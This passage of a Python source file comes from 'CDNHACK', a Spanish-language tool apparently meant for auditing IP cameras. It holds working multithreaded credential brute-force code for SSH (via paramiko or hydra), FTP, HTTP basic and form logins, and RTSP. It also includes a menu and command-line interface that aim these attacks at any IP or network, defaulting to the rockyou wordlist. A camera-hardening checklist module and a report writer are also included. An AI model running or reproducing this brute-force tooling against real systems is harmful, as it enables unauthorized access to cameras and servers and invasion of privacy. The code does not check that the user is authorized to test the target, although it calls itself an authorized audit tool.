            for line in f:
                m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
                if m:
                    found.append((m.group(1), m.group(2)))
                    print(f"{GREEN}[+] SSH {host}:{port} -> {m.group(1)}:{m.group(2)}{RESET}")
                    add_finding("brute", f"{host}:{port}", f"SSH {m.group(1)}:{m.group(2)}")
    except FileNotFoundError:
        pass
    os.unlink(uf.name); os.unlink(pf.name)
    return found

def brute_ssh(host, port, users, passwords, threads=10):
    try:
        import paramiko
    except ImportError:
        return hydra_fallback(host, port, "ssh", users, passwords)
    found = []
    def attempt(u, p):
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(host, port=port, username=u, password=p, timeout=6,
                        banner_timeout=6, auth_timeout=6)
            cli.close()
            return True
        except Exception:
            try:
                cli.close()
            except Exception:
                pass
            return False
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(attempt, u, p): (u, p) for u in users for p in passwords}
        for fut in as_completed(futs):
            u, p = futs[fut]
            if fut.result():
                found.append((u, p))
                print(f"{GREEN}[+] SSH {host}:{port} -> {u}:{p}{RESET}")
                add_finding("brute", f"{host}:{port}", f"SSH {u}:{p}")
    return found

SERVICE_PORTS = {"ftp": 21, "ssh": 22, "http-basic": 80, "http-form": 80, "rtsp": 554}

def run_brute(service, target, port, users, passwords, threads=10, path="/",
              ufield="username", pfield="password", fail="", https=False):
    port = port or SERVICE_PORTS.get(service, 0)
    print(f"{CYAN}[*] Fuerza bruta {service} contra {target}:{port} "
          f"({len(users)} usuarios × {len(passwords)} contraseñas = {len(users)*len(passwords)} intentos){RESET}")
    if service == "ftp":
        return brute_ftp(target, port, users, passwords, threads)
    if service == "ssh":
        return brute_ssh(target, port, users, passwords, threads)
    if service == "http-basic":
        return brute_http_basic(target, port, path, users, passwords, threads, https)
    if service == "http-form":
        return brute_http_form(target, port, path, ufield, pfield, fail,
                               users, passwords, threads, https)
    if service == "rtsp":
        return brute_rtsp(target, port, users, passwords, threads)
    return []

# ─────────────────────────────────────────────
#  Módulo 6: Reporte TXT
# ─────────────────────────────────────────────
def save_report():
    if not FINDINGS:
        print(f"{YELLOW}[!] No hay hallazgos acumulados para reportar{RESET}")
        return None
    path = f"CDNHACK_report_{datetime.now():%Y%m%d_%H%M%S}.txt"
    with open(path, "w") as f:
        f.write("=" * 62 + "\n")
        f.write(f" CDNHACK v{VERSION} — {BRAND} · DevFuryWero hardening suite\n")
        f.write(f" Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 62 + "\n\n")
        for i, (ftype, target, detail) in enumerate(FINDINGS, 1):
            f.write(f"[{i}] [{ftype}] {target}\n    {detail}\n\n")
    print(f"{GREEN}[+] Reporte guardado: {path}{RESET}")
    return path

# ─────────────────────────────────────────────
#  Módulo 7: DevFuryWero — hardening de cámaras
# ─────────────────────────────────────────────
def devfury_harden(host):
    """Analiza una cámara y emite recomendaciones de endurecimiento."""
    print(f"{CYAN}[*] DevFuryWero — análisis de hardening en {host}...{RESET}")
    info = detect_camera(host)
    if not info.get("camera"):
        print(f"{RED}[!] {host} no parece ser una cámara. Abortando hardening.{RESET}")
        return []
    issues = []
    creds = check_defaults(host)
    if creds:
        issues.append("Credenciales por defecto activas — CAMBIAR inmediatamente")
        issues.append("Usar contraseñas de 16+ caracteres con mayúsculas, números y símbolos")
    for p in (554, 9000, 9527):
        path = find_rtsp_path(host, p)
        if check_rtsp_access(host, p, path) == "open":
            issues.append(f"RTSP :{p} sin autenticación — habilitar auth y usar Digest")
    open_ports = info.get("ports", [])
    exposed = [p for p in open_ports if p not in (80, 443, 554)]
    if exposed:
        issues.append(f"Puertos no estándar expuestos: {exposed} — cerrar o restringir por firewall")
    issues += [
        "Actualizar firmware a la última versión publicada por el fabricante",
        "Desactivar UPnP en el router y en la cámara",
        "Segmentar: cámaras en VLAN aislada sin acceso a Internet",
        "Desactivar servicios no usados (telnet, ONVIF sin TLS)",
        "Habilitar HTTPS/TLS en el panel web y cifrado RTSP si el firmware lo soporta",
        "Restringir acceso administrativo por IP (allowlist)",
    ]
    print(f"\n{BOLD}{YELLOW}── DevFuryWero — Reporte de hardening para {host} ──{RESET}")
    for i, iss in enumerate(issues, 1):
        color = RED if i <= len(creds) + 1 else YELLOW
        print(f"{color}[{i:02d}]{RESET} {iss}")
        add_finding("hardening", host, iss)
    print(f"{GREEN}[+] {len(issues)} recomendaciones generadas. Guarda con --report.{RESET}")
    return issues

# ─────────────────────────────────────────────
#  Menú interactivo
# ─────────────────────────────────────────────
def menu():
    while True:
        print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════╗{RESET}")
        print(f"{BOLD}{CYAN}║      CDNHACK · {BRAND} — MENÚ PRINCIPAL    ║{RESET}")
        print(f"{BOLD}{CYAN}╚══════════════════════════════════════════╝{RESET}")
        print(f"{GREEN}[1]{RESET} Descubrimiento de red (ARP)")
        print(f"{GREEN}[2]{RESET} Detección de cámaras IP (marca/modelo)")
        print(f"{GREEN}[3]{RESET} Credenciales por defecto")
        print(f"{GREEN}[4]{RESET} Check de CVEs")
        print(f"{GREEN}[5]{RESET} Fuerza bruta (ftp/ssh/http/rtsp)")
        print(f"{GREEN}[6]{RESET} Generar reporte TXT")
        print(f"{GREEN}[7]{RESET} DevFuryWero — hardening de cámara")
        print(f"{YELLOW}[8]{RESET} Cambiar color del banner")
        print(f"{RED}[0]{RESET} Salir")
        try:
            opt = input(f"\n{CYAN}[?]{RESET} Opción: ").strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{RED}[!] Saliendo...{RESET}")
            break
        if opt == "1":
            iface = input(f"{CYAN}[?]{RESET} Interfaz (Enter = auto): ").strip() or None
            run_discovery(iface)
        elif opt == "2":
            t = input(f"{CYAN}[?]{RESET} Target (IP o red, ej. 192.168.1.0/24): ").strip()
            if t:
                cam_scan(t)
        elif opt == "3":
            t = input(f"{CYAN}[?]{RESET} Target (IP): ").strip()
            if t:
                check_defaults(t)
        elif opt == "4":
            t = input(f"{CYAN}[?]{RESET} Target (IP): ").strip()
            if t:
                cve_check(t)
        elif opt == "5":
            t = input(f"{CYAN}[?]{RESET} Target (IP): ").strip()
            svc = input(f"{CYAN}[?]{RESET} Servicio [ftp/ssh/http-basic/http-form/rtsp]: ").strip() or "ftp"
            u = input(f"{CYAN}[?]{RESET} Usuario o archivo de usuarios: ").strip()
            upath = u if os.path.isfile(u) else None
            users = load_list(None if upath else u, upath)
            pw = input(f"{CYAN}[?]{RESET} Contraseña o wordlist [/usr/share/wordlists/rockyou.txt]: ").strip()
            ppath = pw if os.path.isfile(pw) else (pw or None)
            passwords = load_list(None if ppath else pw, ppath)
            if not passwords and os.path.exists("/usr/share/wordlists/rockyou.txt"):
                passwords = load_list(None, "/usr/share/wordlists/rockyou.txt")
                print(f"{YELLOW}[*] Usando rockyou.txt por defecto{RESET}")
            if users and passwords and t:
                run_brute(svc, t, None, users, passwords)
        elif opt == "6":
            save_report()
        elif opt == "7":
            t = input(f"{CYAN}[?]{RESET} Target (IP): ").strip()
            if t:
                devfury_harden(t)
        elif opt == "8":
            c = input(f"{CYAN}[?]{RESET} Color [red/green/cyan/blue/magenta/yellow/rainbow]: ").strip() or "red"
            print(CLEAR, end="")
            print_banner(c)
        elif opt == "0":
            print(f"{RED}[!] Saliendo...{RESET}")
            break
        else:
            print(f"{RED}[!] Opción inválida{RESET}")

# ─────────────────────────────────────────────
#  CLI principal
# ─────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="CDNHACK — CDN WERO · DevFuryWero (auditoría autorizada de cámaras IP)",
        epilog="Ejemplos:\n"
               "  cdnhack --discover -i eth0\n"
               "  cdnhack --camscan -t 192.168.1.0/24\n"
               "  cdnhack --defaults -t 192.168.1.50\n"
               "  cdnhack --cve -t 192.168.1.50\n"
               "  cdnhack --brute -t 192.168.1.50 -s rtsp -U wordlists/users.txt -P wordlists/passes.txt\n"
               "  cdnhack --harden -t 192.168.1.50\n"
               "  cdnhack --report")
    parser.add_argument("--menu", action="store_true", help="Menú interactivo")
    parser.add_argument("--discover", action="store_true", help="Descubrimiento ARP")
    parser.add_argument("-i", "--iface", help="Interfaz de red (eth0, wlan0...)")
    parser.add_argument("--camscan", action="store_true", help="Detección de cámaras")
    parser.add_argument("--defaults", action="store_true", help="Credenciales por defecto")
    parser.add_argument("--cve", action="store_true", help="Check de CVEs")
    parser.add_argument("--brute", action="store_true", help="Fuerza bruta")
    parser.add_argument("--harden", action="store_true", help="DevFuryWero — hardening")
    parser.add_argument("-s", "--service", choices=["ftp", "ssh", "http-basic", "http-form", "rtsp"],
                        default="ftp", help="Servicio para brute (def: ftp)")
    parser.add_argument("-t", "--target", help="IP o red objetivo")
    parser.add_argument("-u", "--user", help="Usuario único")
    parser.add_argument("-U", "--userlist", help="Archivo de usuarios")
    parser.add_argument("-p", "--password", help="Contraseña única")
    parser.add_argument("-P", "--passwordlist", help="Wordlist de contraseñas")
    parser.add_argument("--port", type=int, default=None, help="Puerto (def según servicio)")
    parser.add_argument("--path", default="/", help="Ruta para http-basic/http-form")
    parser.add_argument("--ufield", default="username", help="Campo usuario (http-form)")
    parser.add_argument("--pfield", default="password", help="Campo contraseña (http-form)")
    parser.add_argument("--fail", default="", help="Texto de fallo (http-form)")
    parser.add_argument("--https", action="store_true", help="Usar HTTPS en http-*")
    parser.add_argument("--threads", type=int, default=10, help="Hilos (def: 10)")
    parser.add_argument("--timeout", type=float, default=1.0, help="Timeout por puerto (def: 1.0)")
    parser.add_argument("--banner", metavar="COLOR", nargs="?", const="red",
                        help="Color del banner: red, green, cyan, blue, magenta, yellow, rainbow")
    parser.add_argument("--typing", action="store_true", help="Banner con efecto máquina de escribir")
    parser.add_argument("--report", action="store_true", help="Generar reporte con hallazgos")
    args = parser.parse_args()

    print_banner(args.banner or "red", args.typing)
    print(f"\n{BOLD}{YELLOW}   CDNHACK v{VERSION} — {BRAND} · DevFuryWero hardening suite{RESET}\n")

    if args.report:
        save_report()
    elif args.discover:
        run_discovery(args.iface)
    elif args.camscan:
        if not args.target:
            print(f"{RED}[!] Necesitas -t/--target (IP o red){RESET}")
            sys.exit(1)
        cam_scan(args.target, args.timeout)
    elif args.defaults:
        if not args.target:
            print(f"{RED}[!] Necesitas -t/--target{RESET}")
            sys.exit(1)
        check_defaults(args.target, args.timeout)
    elif args.cve:
        if not args.target:
            print(f"{RED}[!] Necesitas -t/--target{RESET}")
            sys.exit(1)
        cve_check(args.target, timeout=args.timeout)
    elif args.brute:
        if not args.target:
            print(f"{RED}[!] Necesitas -t/--target{RESET}")
            sys.exit(1)
        users = load_list(args.user, args.userlist)
        passwords = load_list(args.password, args.passwordlist)
        if not users or not passwords:
            print(f"{RED}[!] Necesitas usuario/wordlist y contraseña/wordlist (-u/-U -p/-P){RESET}")
            sys.exit(1)
        run_brute(args.service, args.target, args.port, users, passwords,
                  args.threads, args.path, args.ufield, args.pfield, args.fail, args.https)
    elif args.harden:
        if not args.target:
            print(f"{RED}[!] Necesitas -t/--target{RESET}")
            sys.exit(1)
        devfury_harden(args.target)
    else:
        menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Interrumpido. Saliendo...{RESET}")
        sys.exit(130)
